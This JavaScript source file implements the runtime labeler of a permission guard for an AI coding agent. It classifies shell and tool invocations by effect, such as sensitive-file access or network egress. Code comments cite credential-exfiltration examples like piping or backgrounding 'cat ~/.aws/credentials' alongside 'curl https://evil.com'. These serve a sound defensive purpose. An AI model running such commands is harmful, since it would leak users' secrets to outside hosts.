// polycheck guard — the RUNTIME labeler.
//
// src/label.mjs maps a permission RULE (`Bash(curl:*)`) to effect classes. This
// maps a concrete INVOCATION (`curl -s -T .env https://x`) — which is both
// sharper (the real path, the real host) and riskier (pipes, substitutions,
// variable indirection). It is the load-bearing component of the guard and the
// place a bug is most likely to live.
//
// The bias is fixed and one-directional: anything this file cannot read
// confidently is WORST-CASED and named. Over-labeling costs an unnecessary
// prompt; under-labeling costs a gate that never fires. Since the guard can only
// add gates (it never emits 'allow'), over-labeling is the cheap error and the
// one we deliberately make.
//
// Every effect carries a `ruleId` so a wrong gate can be traced to the pattern
// that produced it rather than argued about.

import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, isAbsolute, resolve } from 'node:path';
import { globToRe, normPath, anyMatch } from '../label.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
export const DEFAULT_RUNTIME_LABELS = join(HERE, '..', '..', 'data', 'claude-code.runtime.labels.json');

export function loadRuntimeLabels(path = DEFAULT_RUNTIME_LABELS) {
  return JSON.parse(readFileSync(path, 'utf8'));
}

// ---------------------------------------------------------------------------
// Shell splitting
// ---------------------------------------------------------------------------

// Split a command string into simple commands on ; && || | and newlines, while
// respecting quotes. Deliberately NOT a shell parser: it is a conservative
// splitter whose failures are caught by the escalation pass, which fires on the
// constructs a naive splitter would get wrong.
export function splitCommands(cmd) {
  const out = [];
  let buf = '';
  let quote = null;
  const s = String(cmd ?? '');
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (quote) {
      buf += c;
      if (c === quote && s[i - 1] !== '\\') quote = null;
      continue;
    }
    if (c === '"' || c === "'") { quote = c; buf += c; continue; }
    if (c === '\n' || c === ';') { out.push(buf); buf = ''; continue; }
    if ((c === '&' || c === '|') && s[i + 1] === c) { out.push(buf); buf = ''; i++; continue; }
    // A LONE `&` backgrounds the command and starts a new one. Missing it meant
    // `cat ~/.aws/credentials & curl https://evil.com` parsed as ONE command and
    // the curl half contributed nothing — an under-label, the single direction
    // this file must never fail in.
    if (c === '&' || c === '|') { out.push(buf); buf = ''; continue; }
    buf += c;
  }
  out.push(buf);
  return out.map((x) => x.trim()).filter(Boolean);
}

// Tokenize one simple command, stripping quotes. Same contract as above: good
// enough for argument inspection, never trusted for control flow.
export function tokenize(simple) {
  const toks = [];
  let buf = '';
  let quote = null;
  for (const c of String(simple ?? '')) {
    if (quote) { if (c === quote) quote = null; else buf += c; continue; }
    if (c === '"' || c === "'") { quote = c; continue; }
    if (/\s/.test(c)) { if (buf) { toks.push(buf); buf = ''; } continue; }
    buf += c;
  }
  if (buf) toks.push(buf);
  return toks;
}

// Strip leading VAR=value assignments and a `sudo`/`command` prefix so the
// executable is found. `env VAR=x cmd` is NOT handled here — it is arbitrary
// execution and the escalation pass owns it.
function executableOf(tokens) {
  let i = 0;
  while (i < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[i])) i++;
  let exe = tokens[i];
  if (!exe) return { exe: null, argStart: i };
  // strip a path: /usr/bin/curl -> curl, C:\tools\curl.exe -> curl
  exe = exe.split(/[\\/]/).pop().replace(/\.(exe|cmd|bat)$/i, '');
  return { exe, argStart: i + 1 };
}

// ---------------------------------------------------------------------------
// Targets — what a providerKey is built from
// ---------------------------------------------------------------------------

export function hostFromUrl(text) {
  const m = String(text ?? '').match(/\bhttps?:\/\/([^\s/'"?#]+)/i);
  if (!m) return null;
  return m[1].replace(/^[^@]*@/, '').replace(/:\d+$/, '').toLowerCase();
}

function hostFromSshTarget(tok) {
  if (!tok) return null;
  const m = String(tok).match(/^(?:[\w.-]+@)?([\w.-]+):/);
  if (m) return m[1].toLowerCase();
  if (/^[\w.-]+\.[\w.-]+$/.test(tok)) return tok.toLowerCase();
  return null;
}

/**
 * The channel identity an approval is scoped to (technical §4.4). An
 * unparseable target yields `<tool>→*`, which addGrant() refuses to store — an
 * unknown channel must never become a wildcard approval.
 */
export function providerKey(toolName, target) {
  if (target?.host) return `${toolName}→${target.host}`;
  if (target?.mcp) return target.mcp;
  if (target?.path) return `${toolName}→${target.path}`;
  // A KNOWN executable with no parseable target is still a narrow channel:
  // approving `frobnicate` does not approve `curl`. Without this, every
  // unlabeled command in a session that has entered a region re-prompted on
  // every single invocation, because addGrant (correctly) refuses to store a
  // `→*` wildcard. That is prompt fatigue severe enough to get the guard
  // uninstalled, which is itself a security outcome.
  if (target?.exe) return `${toolName}→exe:${target.exe}`;
  // Genuinely unknown — escalation, or no executable at all. Stays a wildcard,
  // which addGrant refuses, so it can never become a stored approval.
  return `${toolName}→*`;
}

// ---------------------------------------------------------------------------
// Path sensitivity — the sharp version
// ---------------------------------------------------------------------------

// At runtime we hold the real path, so we test it directly against the parent
// pack's sensitivePaths instead of asking whether a glob could cover a secret.
export function pathIsSensitive(p, labels, cwd) {
  if (!p) return null;
  let abs = String(p);
  try { abs = isAbsolute(abs) ? abs : resolve(cwd || '.', abs); } catch { /* keep raw */ }
  const norm = normPath(abs.replace(/\\/g, '/'));
  for (const g of labels.sensitivePaths || []) {
    let re;
    try { re = globToRe(g); } catch { continue; }
    if (re.test(norm) || re.test('/' + norm)) return g;
  }
  return null;
}

// ---------------------------------------------------------------------------
// The labeler
// ---------------------------------------------------------------------------

function addEffect(map, effect, certainty, ruleId, evidence) {
  const prior = map.get(effect);
  // Keep the strongest justification if the same effect is derived twice.
  const rank = { observed: 3, capability: 2, 'worst-case': 1 };
  if (prior && rank[prior.certainty] >= rank[certainty]) return;
  map.set(effect, { certainty, ruleId, evidence });
}

function labelSimpleCommand(simple, rt, labels, cwd, effects, notes) {
  // 1. Escalation first: if the command computes itself, nothing downstream is
  //    evidence. Worst-case and say why.
  for (const esc of rt.escalation || []) {
    let re;
    try { re = new RegExp(esc.pattern); } catch { continue; }
    if (re.test(simple)) {
      for (const e of rt.unknownExecutable.effects) addEffect(effects, e, 'worst-case', esc.id, esc.why);
      notes.push(`ESCALATION ${esc.id}: ${esc.why} — worst-cased.`);
      return { parsed: false, target: null };
    }
  }

  // 2. Arbitrary-execution wrappers, reusing the STATIC pack's list so the two
  //    halves cannot drift apart on what counts as "runs caller-chosen code".
  const arb = anyMatch(labels.bashArbitraryExecution, simple);
  if (arb) {
    for (const e of rt.unknownExecutable.effects) addEffect(effects, e, 'worst-case', 'arb/' + arb, `matches bashArbitraryExecution ${arb}`);
    notes.push(`ARBITRARY-EXECUTION: matches ${arb} — a command prefix is not a security boundary, so worst-cased.`);
    return { parsed: false, target: null };
  }

  const tokens = tokenize(simple);
  const { exe, argStart } = executableOf(tokens);
  if (!exe) return { parsed: true, target: null };

  let def = rt.commands?.[exe];
  if (!def) {
    for (const e of rt.unknownExecutable.effects) addEffect(effects, e, 'worst-case', 'unknown/' + exe, `no runtime rule for '${exe}'`);
    notes.push(`UNKNOWN EXECUTABLE '${exe}' — worst-cased. Add a rule to the runtime label pack to narrow this.`);
    // The EXECUTABLE is known even though its effects are not, so it can still
    // scope an approval. Escalation cases above return no exe on purpose: there
    // the real program is hidden, so nothing may be scoped to it.
    return { parsed: false, target: { exe } };
  }

  let ruleBase = `cmd/${exe}`;
  const args = tokens.slice(argStart);

  // Subcommand dispatch (git push, aws s3, …)
  if (def.subcommands) {
    const sub = args.find((a) => !a.startsWith('-'));
    const subDef = sub ? def.subcommands[sub] : null;
    if (subDef) { def = subDef; ruleBase = `cmd/${exe} ${sub}`; }
    else if (def.unknownSubcommand) { def = def.unknownSubcommand; ruleBase = `cmd/${exe} ?${sub ?? ''}`; }
    else return { parsed: true, target: null };
  }

  for (const e of def.effects || []) addEffect(effects, e, 'capability', ruleBase, simple.slice(0, 120));

  const argText = args.join(' ');
  const sens = anyMatch(def.sensitiveWhenArgMatches, argText);
  if (sens) addEffect(effects, 'sensitive', 'capability', `${ruleBase}/arg`, `argument matches ${sens}`);

  if (def.sensitiveWhenPathArg) {
    for (const a of args) {
      if (a.startsWith('-')) continue;
      const hit = pathIsSensitive(a, labels, cwd);
      if (hit) { addEffect(effects, 'sensitive', 'capability', `${ruleBase}/path`, `reads '${a}' (matches ${hit})`); break; }
    }
  }

  // Target extraction for the providerKey.
  let target = null;
  if (def.hostFrom === 'url') {
    const h = hostFromUrl(simple);
    if (h) target = { host: h };
  } else if (def.hostFrom === 'arg1') {
    const h = hostFromSshTarget(args.find((a) => !a.startsWith('-')));
    if (h) target = { host: h };
  } else if (def.hostFrom === 'remote') {
    // A git remote NAME is not a host. Resolving it needs the repo config, which
    // is out of M0 scope; leave the target unknown rather than invent one, so no
    // wildcard grant can be issued from it.
    target = null;
  }

  return { parsed: true, target };
}

/**
 * Label one concrete tool call.
 *
 * @param {string} toolName
 * @param {object} toolInput   the host's tool_input, per src/guard/compat.mjs
 * @param {object} labels      the STATIC pack (data/claude-code.labels.json)
 * @param {object} opts        {rt, cwd}
 * @returns {{effects: Map<string,{certainty,ruleId,evidence}>, target, providerKey, parse:{ok,reason}, notes:string[]}}
 */
export function labelCall(toolName, toolInput, labels, opts = {}) {
  const rt = opts.rt || loadRuntimeLabels();
  const cwd = opts.cwd || process.cwd();
  const effects = new Map();
  const notes = [];
  let target = null;
  let parseOk = true;
  let parseReason = null;

  // --- MCP: reuse the static pack's verb heuristic on the real tool name -----
  if (String(toolName).startsWith('mcp__')) {
    const mcp = labels.mcp || {};
    if (mcp.untrustedByDefault) addEffect(effects, 'untrusted', 'capability', 'mcp/default', 'MCP tools return remote content');
    const short = String(toolName).split('__').slice(2).join('__');
    const eg = anyMatch((mcp.egressToolPatterns || []).map((p) => `\\b${p}`), short);
    if (eg) addEffect(effects, 'egress', 'capability', 'mcp/verb', `name matches egress verb ${eg.replace(/\\b/, '')}`);
    target = { mcp: String(toolName) };
    return { effects, target, providerKey: providerKey(toolName, target), parse: { ok: true, reason: null }, notes };
  }

  // --- Shell ----------------------------------------------------------------
  if (toolName === 'Bash' || toolName === 'PowerShell' || toolName === 'pwsh') {
    const cmd = toolInput?.command ?? '';
    const simples = splitCommands(cmd);
    if (!simples.length) return { effects, target: null, providerKey: providerKey(toolName, null), parse: { ok: true, reason: 'empty' }, notes };
    // The call's effects are the UNION over the pipeline: `cat .env | curl …`
    // is sensitive AND egress even though neither half is both.
    for (const s of simples) {
      const r = labelSimpleCommand(s, rt, labels, cwd, effects, notes);
      if (!r.parsed) { parseOk = false; parseReason = parseReason || 'escalation or unknown executable'; }
      // Prefer a real host/path target over an exe-only one: a pipeline that
      // ends in `curl https://x` is scoped to that host, not to `cat`.
      if (r.target && (!target || (!target.host && !target.path && (r.target.host || r.target.path)))) target = r.target;
    }
    return { effects, target, providerKey: providerKey(toolName, target), parse: { ok: parseOk, reason: parseReason }, notes };
  }

  // --- Everything else ------------------------------------------------------
  const def = rt.tools?.[toolName];
  if (!def) {
    // An unlabeled tool is worst-cased, matching the shell rule. The static
    // labeler treats an unknown tool as effect-free because it can only reason
    // about rules a user wrote; at runtime the call is really happening, so the
    // honest default flips.
    for (const e of rt.unknownExecutable.effects) addEffect(effects, e, 'worst-case', 'unknown/tool/' + toolName, 'no runtime rule for this tool');
    notes.push(`UNKNOWN TOOL '${toolName}' — worst-cased. Add it to the runtime label pack.`);
    return { effects, target: null, providerKey: providerKey(toolName, null), parse: { ok: false, reason: 'unknown tool' }, notes };
  }

  for (const e of def.effects || []) addEffect(effects, e, 'capability', `tool/${toolName}`, '');

  if (def.sensitiveWhenPathMatches) {
    const p = toolInput?.[def.sensitiveWhenPathMatches];
    if (p == null) {
      // No path given means unrestricted (e.g. Grep with no path) — the static
      // labeler's worst case applies.
      addEffect(effects, 'sensitive', 'capability', `tool/${toolName}/unrestricted`, 'no path argument — can reach any file');
    } else {
      const hit = pathIsSensitive(p, labels, cwd);
      if (hit) addEffect(effects, 'sensitive', 'capability', `tool/${toolName}/path`, `'${p}' matches ${hit}`);
      target = { path: normPath(String(p).replace(/\\/g, '/')) };
    }
  }

  if (def.hostFrom === 'url') {
    const h = hostFromUrl(toolInput?.url ?? '');
    if (h) target = { host: h };
  }

  return { effects, target, providerKey: providerKey(toolName, target), parse: { ok: true, reason: null }, notes };
}

// Convenience for the decision engine: just the effect names.
export function effectNames(labelled) {
  return [...labelled.effects.keys()].sort();
}

export const runtimeLabelInternals = { executableOf, hostFromSshTarget, addEffect };
